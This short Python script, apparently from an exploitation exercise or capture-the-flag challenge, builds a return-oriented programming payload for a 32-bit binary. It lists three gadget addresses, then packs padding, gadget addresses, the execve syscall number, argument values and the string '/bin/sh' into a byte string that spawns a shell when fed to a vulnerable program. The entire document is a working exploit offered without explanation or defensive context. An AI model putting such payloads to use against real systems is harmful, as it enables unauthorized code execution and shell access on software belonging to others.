"""

gadgets:

E: 809dcfa: pop %eax, pop %ebx, pop %esi, pop %edi, ret

F: 806ea60: pop %edx, pop %ecx, pop %ebx, ret

G: 806f100: int $0x80, ret

[ padding ] [ E ] [ 0xb ] [ address of "/bin/sh" ] [ 4 bytes ] [ 4 bytes ] [ F ] [ 0 ] [ 0 ] [ 4 bytes ] [ G ] ["/bin/sh"]

"""

payload = 'A'*29   # padding
payload += '\xfa\xdc\x09\x08'   # E
payload += '\x0b\x00\x00\x00'   # 0xb syscall number for execve
payload += '\xff\xff\xa0\xa0'   # location of "/bin/sh" (1st argument for execve) 
payload += '\x00\x00\x00\x00'   # 4 bytes padding 
payload += '\x00\x00\x00\x00'   # 4 bytes padding 
payload += '\x60\xea\x06\x08'   # F
payload += '\x00\x00\x00\x00'   # 0  (2nd argument for execve) 
payload += '\x00\x00\x00\x00'   # 0  (3rd argument for execve) 
payload += '\x00\x00\x00\x00'   # 4 bytes padding
payload += '\x00\xf1\x06\x08'   # syscall 
payload += '/bin/sh'            

print(payload)
